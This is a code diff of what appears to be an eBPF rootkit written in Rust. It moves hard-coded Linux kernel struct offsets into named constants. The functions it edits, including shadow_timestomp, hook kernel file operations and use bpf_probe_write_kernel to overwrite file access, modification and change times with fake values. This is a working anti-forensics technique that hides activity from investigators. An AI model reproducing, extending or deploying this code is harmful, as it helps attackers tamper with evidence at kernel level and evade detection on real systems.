@@ -21,6 +21,20 @@ use common::{
 use core::mem;
 
 // ──────────────────────────────────────────────
+// Kernel Struct Offsets
+// Target: Linux 6.1+ (x86_64). Derived from pahole/BTF.
+// These WILL break on other kernel versions without CO-RE/BTF relocation.
+// ──────────────────────────────────────────────
+
+const FILE_F_INODE_OFFSET: u64 = 32;       // struct file → f_inode
+const INODE_I_INO_OFFSET: u64 = 64;        // struct inode → i_ino
+const PATH_DENTRY_OFFSET: u64 = 8;         // struct path → dentry
+const DENTRY_D_INODE_OFFSET: u64 = 48;     // struct dentry → d_inode
+const KSTAT_ATIME_OFFSET: u64 = 72;        // struct kstat → atime (timespec64)
+const KSTAT_MTIME_OFFSET: u64 = 88;        // struct kstat → mtime
+const KSTAT_CTIME_OFFSET: u64 = 104;       // struct kstat → ctime
+
+// ──────────────────────────────────────────────
 // BPF Maps
 // ──────────────────────────────────────────────
 
@@ -501,7 +515,7 @@ fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
         if bpf_probe_read_kernel(
             &mut val as *mut u64 as *mut core::ffi::c_void,
             mem::size_of::<u64>() as u32,
-            (file_ptr + 32) as *const core::ffi::c_void,
+            (file_ptr + FILE_F_INODE_OFFSET) as *const core::ffi::c_void,
         ) < 0 {
             return Ok(0);
         }
@@ -517,7 +531,7 @@ fn try_shadow_vfs_read(ctx: &ProbeContext) -> Result<u32, i64> {
         if bpf_probe_read_kernel(
             &mut val as *mut u64 as *mut core::ffi::c_void,
             mem::size_of::<u64>() as u32,
-            (f_inode_ptr + 64) as *const core::ffi::c_void,
+            (f_inode_ptr + INODE_I_INO_OFFSET) as *const core::ffi::c_void,
         ) < 0 {
             return Ok(0);
         }
@@ -1325,7 +1339,7 @@ pub fn shadow_timestomp_enter(ctx: ProbeContext) -> u32 {
         if bpf_probe_read_kernel(
             &mut val as *mut u64 as *mut core::ffi::c_void,
             8,
-            (path_ptr + 8) as *const core::ffi::c_void,
+            (path_ptr + PATH_DENTRY_OFFSET) as *const core::ffi::c_void,
         ) < 0 {
             return 0;
         }
@@ -1341,7 +1355,7 @@ pub fn shadow_timestomp_enter(ctx: ProbeContext) -> u32 {
         if bpf_probe_read_kernel(
             &mut val as *mut u64 as *mut core::ffi::c_void,
             8,
-            (dentry_ptr + 48) as *const core::ffi::c_void,
+            (dentry_ptr + DENTRY_D_INODE_OFFSET) as *const core::ffi::c_void,
         ) < 0 {
             return 0;
         }
@@ -1357,7 +1371,7 @@ pub fn shadow_timestomp_enter(ctx: ProbeContext) -> u32 {
         if bpf_probe_read_kernel(
             &mut val as *mut u64 as *mut core::ffi::c_void,
             8,
-            (inode_ptr + 64) as *const core::ffi::c_void,
+            (inode_ptr + INODE_I_INO_OFFSET) as *const core::ffi::c_void,
         ) < 0 {
             return 0;
         }
@@ -1400,20 +1414,17 @@ fn try_timestomp(_ctx: &ProbeContext) -> Result<u32, i64> {
         None => return Ok(0),
     };
 
-    const ATIME_OFFSET: u64 = 72;
-    const MTIME_OFFSET: u64 = 88;
-    const CTIME_OFFSET: u64 = 104;
 
     let zero_nsec: i64 = 0;
 
     unsafe {
         let _ = bpf_probe_write_kernel(
-            (args.kstat_ptr + ATIME_OFFSET) as *mut core::ffi::c_void,
+            (args.kstat_ptr + KSTAT_ATIME_OFFSET) as *mut core::ffi::c_void,
             &entry.fake_atime_sec as *const u64 as *const core::ffi::c_void,
             8,
         );
         let _ = bpf_probe_write_kernel(
-            (args.kstat_ptr + ATIME_OFFSET + 8) as *mut core::ffi::c_void,
+            (args.kstat_ptr + KSTAT_ATIME_OFFSET + 8) as *mut core::ffi::c_void,
             &zero_nsec as *const i64 as *const core::ffi::c_void,
             8,
         );
@@ -1421,12 +1432,12 @@ fn try_timestomp(_ctx: &ProbeContext) -> Result<u32, i64> {
 
     unsafe {
         let _ = bpf_probe_write_kernel(
-            (args.kstat_ptr + MTIME_OFFSET) as *mut core::ffi::c_void,
+            (args.kstat_ptr + KSTAT_MTIME_OFFSET) as *mut core::ffi::c_void,
             &entry.fake_mtime_sec as *const u64 as *const core::ffi::c_void,
             8,
         );
         let _ = bpf_probe_write_kernel(
-            (args.kstat_ptr + MTIME_OFFSET + 8) as *mut core::ffi::c_void,
+            (args.kstat_ptr + KSTAT_MTIME_OFFSET + 8) as *mut core::ffi::c_void,
             &zero_nsec as *const i64 as *const core::ffi::c_void,
             8,
         );
@@ -1434,12 +1445,12 @@ fn try_timestomp(_ctx: &ProbeContext) -> Result<u32, i64> {
 
     unsafe {
         let _ = bpf_probe_write_kernel(
-            (args.kstat_ptr + CTIME_OFFSET) as *mut core::ffi::c_void,
+            (args.kstat_ptr + KSTAT_CTIME_OFFSET) as *mut core::ffi::c_void,
             &entry.fake_ctime_sec as *const u64 as *const core::ffi::c_void,
             8,
         );
         let _ = bpf_probe_write_kernel(
-            (args.kstat_ptr + CTIME_OFFSET + 8) as *mut core::ffi::c_void,
+            (args.kstat_ptr + KSTAT_CTIME_OFFSET + 8) as *mut core::ffi::c_void,
             &zero_nsec as *const i64 as *const core::ffi::c_void,
             8,
         );
